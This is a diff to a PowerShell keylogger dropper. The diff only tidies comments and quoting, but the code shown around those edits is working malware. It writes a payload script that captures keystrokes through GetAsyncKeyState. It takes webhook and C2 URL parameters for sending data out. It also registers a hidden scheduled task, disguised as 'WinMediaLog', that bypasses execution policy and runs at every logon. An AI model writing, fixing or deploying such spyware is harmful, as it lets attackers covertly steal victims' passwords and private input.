@@ -6,7 +6,7 @@ if (!(Test-Path $dir)) { New-Item $dir -Type Directory | Out-Null }
 $logFile = "$dir\data.txt"
 $scriptPath = "$dir\winlog.ps1"
 
-# The entire operational script uses literal characters to prevent variable breaking
+# The entire operational script block using robust literal formatting
 $payloadContent = @'
 param([string]$PCName, [string]$WebhookUrl, [string]$C2Url, [string]$logFile)
 
@@ -37,12 +37,11 @@ while ($true) {
         if ([KeyEngine]::GetAsyncKeyState($i) -eq -32767) {
             $keyText = ""
             
-            # Handle special structural execution keys directly
             switch ($i) {
                 8   { $keyText = " [BACKSPACE] " }
                 9   { $keyText = " [TAB] " }
                 13  { $keyText = "`n" }
-                16  { $keyText = "" } # Ignore lone Shift alerts
+                16  { $keyText = "" } 
                 17  { $keyText = " [CTRL] " }
                 18  { $keyText = " [ALT] " }
                 20  { $keyText = " [CAPS] " }
@@ -50,7 +49,6 @@ while ($true) {
                 32  { $keyText = " " }
                 46  { $keyText = " [DEL] " }
                 default {
-                    # Translate standard values to unicode relative to active shift/caps locks
                     $keyState = New-Object byte[] 256
                     [KeyEngine]::GetKeyboardState($keyState) | Out-Null
                     $scanCode = [KeyEngine]::MapVirtualKey($i, 0)
@@ -104,9 +102,9 @@ while ($true) {
 # Save payload cleanly to the local execution folder 
 Set-Content -Path $scriptPath -Value $payloadContent -Force
 
-# Wipe older scheduled automation structures 
-schtasks /delete /tn 'WinMediaLog' /f 2>&1 | Out-Null
+# Wipe older scheduled automation structures using safe outer double quotes
+schtasks /delete /tn "WinMediaLog" /f 2>&1 | Out-Null
 
-# Register and execute the production loop task via Task Scheduler
-schtasks /create /f /tn 'WinMediaLog' /tr "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`" -PCName `"$PCName`" -WebhookUrl `"$WebhookUrl`" -C2Url `"$C2Url`" -logFile `"$logFile`"" /sc onlogon
-schtasks /run /tn 'WinMediaLog'
+# Register and execute the production loop task via Task Scheduler cleanly
+schtasks /create /f /tn "WinMediaLog" /tr "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`" -PCName `"$PCName`" -WebhookUrl `"$WebhookUrl`" -C2Url `"$C2Url`" -logFile `"$logFile`"" /sc onlogon
+schtasks /run /tn "WinMediaLog"
